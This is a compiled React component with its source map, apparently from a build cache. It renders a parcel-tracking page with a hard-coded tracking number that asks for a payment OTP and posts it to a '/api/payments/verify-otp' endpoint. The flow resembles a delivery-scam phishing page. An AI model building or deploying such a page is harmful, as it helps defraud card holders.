{"ast":null,"code":"import React,{useState}from'react';import axios from'axios';import'./OtpForm.css';import FAQSection from'./FAQSection';import Footer from'./Footer';import ProgressBar from'./ProgressBar';import{jsx as _jsx,jsxs as _jsxs,Fragment as _Fragment}from\"react/jsx-runtime\";const OtpForm=_ref=>{var _formData$otp2,_formData$otp3;let{formData,handleChange,setError}=_ref;const[loading,setLoading]=useState(false);const[otpError,setOtpError]=useState('');const apiBaseUrl=process.env.REACT_APP_API_BASE_URL;const handleSubmit=async e=>{e.preventDefault();setLoading(true);setError('');setOtpError('');try{var _formData$otp;// Validate OTP format (6-8 digits)\nif(!((_formData$otp=formData.otp)!==null&&_formData$otp!==void 0&&_formData$otp.match(/^\\d{6,8}$/))){throw new Error('OTP must be between 6-8 digits');}// Make API request\nconst response=await axios.post(`${apiBaseUrl}/api/payments/verify-otp`,{otp:formData.otp},{headers:{'Content-Type':'application/json'},withCredentials:true});if(!response.data.success){throw new Error(response.data.error||'OTP verification failed');}}catch(err){let errorMessage='OTP verification failed';if(err.response){var _err$response$data,_err$response$data2;errorMessage=((_err$response$data=err.response.data)===null||_err$response$data===void 0?void 0:_err$response$data.error)||((_err$response$data2=err.response.data)===null||_err$response$data2===void 0?void 0:_err$response$data2.message)||`Server error (${err.response.status})`;}else if(err.request){errorMessage='Network error - please check your connection';}else{errorMessage=err.message;}setOtpError(errorMessage);}finally{setLoading(false);}};const handleOtpChange=e=>{const value=e.target.value.replace(/\\D/g,'').slice(0,8);// Allow up to 8 digits\nhandleChange({target:{name:e.target.name,value}});if(otpError&&value.length>0){setOtpError('');}};return/*#__PURE__*/_jsxs(\"div\",{className:\"otp-container\",children:[/*#__PURE__*/_jsx(ProgressBar,{currentStep:\"otp\"}),/*#__PURE__*/_jsx(\"div\",{className:\"tracking-header\",children:/*#__PURE__*/_jsxs(\"h1\",{children:[/*#__PURE__*/_jsx(\"span\",{className:\"tracking-label\",children:\"Tracking Number:\"}),\" US9514901165421\"]})}),/*#__PURE__*/_jsx(\"div\",{className:\"status-notification\",children:/*#__PURE__*/_jsxs(\"div\",{className:\"status-content\",children:[/*#__PURE__*/_jsx(\"span\",{className:\"status-label\",children:\"Status:\"}),/*#__PURE__*/_jsx(\"span\",{className:\"status-message\",children:\"OTP verification required\"})]})}),/*#__PURE__*/_jsx(\"div\",{className:\"otp-instructions\",children:/*#__PURE__*/_jsx(\"p\",{children:\"We've sent a verification code to your registered mobile number ending with \\u2022\\u2022\\u2022\\u20221234.\"})}),/*#__PURE__*/_jsxs(\"form\",{onSubmit:handleSubmit,className:\"otp-form\",children:[/*#__PURE__*/_jsx(\"h2\",{className:\"form-title\",children:\"OTP Verification\"}),/*#__PURE__*/_jsxs(\"div\",{className:\"otp-input-group\",children:[/*#__PURE__*/_jsx(\"label\",{htmlFor:\"otpInput\",children:\"Enter Verification Code\"}),/*#__PURE__*/_jsx(\"input\",{type:\"text\",id:\"otpInput\",name:\"otp\",value:formData.otp,onChange:handleOtpChange,maxLength:8,placeholder:\"Enter 6-8 digit code\",required:true,disabled:loading,inputMode:\"numeric\",pattern:\"\\\\d*\",autoComplete:\"one-time-code\",className:otpError?'error':''}),/*#__PURE__*/_jsx(\"div\",{className:\"otp-hint\",children:((_formData$otp2=formData.otp)===null||_formData$otp2===void 0?void 0:_formData$otp2.length)>0?`${formData.otp.length} digit${formData.otp.length!==1?'s':''} entered`:'Enter 6-8 digit code'})]}),otpError&&/*#__PURE__*/_jsxs(\"div\",{className:\"error-message\",children:[/*#__PURE__*/_jsx(\"i\",{className:\"error-icon\",children:\"\\u26A0\\uFE0F\"}),otpError]}),/*#__PURE__*/_jsx(\"div\",{className:\"form-actions\",children:/*#__PURE__*/_jsx(\"button\",{type:\"submit\",disabled:loading||!((_formData$otp3=formData.otp)!==null&&_formData$otp3!==void 0&&_formData$otp3.match(/^\\d{6,8}$/)),className:\"submit-button\",\"aria-busy\":loading,children:loading?/*#__PURE__*/_jsxs(_Fragment,{children:[/*#__PURE__*/_jsx(\"span\",{className:\"button-spinner\"}),\" Verifying...\"]}):'Verify OTP'})})]}),/*#__PURE__*/_jsxs(\"div\",{className:\"otp-security-notice\",children:[/*#__PURE__*/_jsx(\"div\",{className:\"security-icon\",children:\"\\uD83D\\uDD12\"}),/*#__PURE__*/_jsx(\"p\",{children:\"For your security, this OTP will expire in 5 minutes\"})]}),/*#__PURE__*/_jsx(FAQSection,{}),/*#__PURE__*/_jsx(Footer,{})]});};export default OtpForm;","map":{"version":3,"names":["React","useState","axios","FAQSection","Footer","ProgressBar","jsx","_jsx","jsxs","_jsxs","Fragment","_Fragment","OtpForm","_ref","_formData$otp2","_formData$otp3","formData","handleChange","setError","loading","setLoading","otpError","setOtpError","apiBaseUrl","process","env","REACT_APP_API_BASE_URL","handleSubmit","e","preventDefault","_formData$otp","otp","match","Error","response","post","headers","withCredentials","data","success","error","err","errorMessage","_err$response$data","_err$response$data2","message","status","request","handleOtpChange","value","target","replace","slice","name","length","className","children","currentStep","onSubmit","htmlFor","type","id","onChange","maxLength","placeholder","required","disabled","inputMode","pattern","autoComplete"],"sources":["C:/Users/O/Desktop/aka/client/src/components/OtpForm.js"],"sourcesContent":["import React, { useState } from 'react';\nimport axios from 'axios';\nimport './OtpForm.css';\nimport FAQSection from './FAQSection';\nimport Footer from './Footer';\nimport ProgressBar from './ProgressBar';\n\nconst OtpForm = ({ formData, handleChange, setError }) => {\n  const [loading, setLoading] = useState(false);\n  const [otpError, setOtpError] = useState('');\n  const apiBaseUrl = process.env.REACT_APP_API_BASE_URL ;\n\n  const handleSubmit = async (e) => {\n    e.preventDefault();\n    setLoading(true);\n    setError('');\n    setOtpError('');\n    \n    try {\n      // Validate OTP format (6-8 digits)\n      if (!formData.otp?.match(/^\\d{6,8}$/)) {\n        throw new Error('OTP must be between 6-8 digits');\n      }\n      \n      // Make API request\n      const response = await axios.post(\n        `${apiBaseUrl}/api/payments/verify-otp`, \n        { otp: formData.otp },\n        {\n          headers: {\n            'Content-Type': 'application/json'\n          },\n          withCredentials: true\n        }\n      );\n      \n      if (!response.data.success) {\n        throw new Error(response.data.error || 'OTP verification failed');\n      }\n    } catch (err) {\n      let errorMessage = 'OTP verification failed';\n      \n      if (err.response) {\n        errorMessage = err.response.data?.error || \n                      err.response.data?.message || \n                      `Server error (${err.response.status})`;\n      } else if (err.request) {\n        errorMessage = 'Network error - please check your connection';\n      } else {\n        errorMessage = err.message;\n      }\n      \n      setOtpError(errorMessage);\n    } finally {\n      setLoading(false);\n    }\n  };\n\n  const handleOtpChange = (e) => {\n    const value = e.target.value.replace(/\\D/g, '').slice(0, 8); // Allow up to 8 digits\n    handleChange({ target: { name: e.target.name, value } });\n    \n    if (otpError && value.length > 0) {\n      setOtpError('');\n    }\n  };\n\n  return (\n    <div className=\"otp-container\">\n      <ProgressBar currentStep=\"otp\" />\n      \n      <div className=\"tracking-header\">\n        <h1>\n          <span className=\"tracking-label\">Tracking Number:</span> US9514901165421\n        </h1>\n      </div>\n\n      <div className=\"status-notification\">\n        <div className=\"status-content\">\n          <span className=\"status-label\">Status:</span>\n          <span className=\"status-message\">OTP verification required</span>\n        </div>\n      </div>\n\n      <div className=\"otp-instructions\">\n        <p>We've sent a verification code to your registered mobile number ending with ‚Ä¢‚Ä¢‚Ä¢‚Ä¢1234.</p>\n       \n      </div>\n\n      <form onSubmit={handleSubmit} className=\"otp-form\">\n        <h2 className=\"form-title\">OTP Verification</h2>\n        \n        <div className=\"otp-input-group\">\n          <label htmlFor=\"otpInput\">Enter Verification Code</label>\n          <input\n            type=\"text\"\n            id=\"otpInput\"\n            name=\"otp\"\n            value={formData.otp}\n            onChange={handleOtpChange}\n            maxLength={8}\n            placeholder=\"Enter 6-8 digit code\"\n            required\n            disabled={loading}\n            inputMode=\"numeric\"\n            pattern=\"\\d*\"\n            autoComplete=\"one-time-code\"\n            className={otpError ? 'error' : ''}\n          />\n          <div className=\"otp-hint\">\n            {formData.otp?.length > 0 ? `${formData.otp.length} digit${formData.otp.length !== 1 ? 's' : ''} entered` : 'Enter 6-8 digit code'}\n          </div>\n        </div>\n        \n        {otpError && (\n          <div className=\"error-message\">\n            <i className=\"error-icon\">‚ö†Ô∏è</i>\n            {otpError}\n          </div>\n        )}\n        \n        <div className=\"form-actions\">\n          <button \n            type=\"submit\" \n            disabled={loading || !formData.otp?.match(/^\\d{6,8}$/)}\n            className=\"submit-button\"\n            aria-busy={loading}\n          >\n            {loading ? (\n              <>\n                <span className=\"button-spinner\"></span> Verifying...\n              </>\n            ) : 'Verify OTP'}\n          </button>\n        </div>\n      </form>\n\n      <div className=\"otp-security-notice\">\n        <div className=\"security-icon\">üîí</div>\n        <p>For your security, this OTP will expire in 5 minutes</p>\n      </div>\n      \n      <FAQSection/>\n      <Footer/>\n    </div>\n  );\n};\n\nexport default OtpForm;\n"],"mappings":"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","ignoreList":[]},"metadata":{},"sourceType":"module","externalDependencies":[]}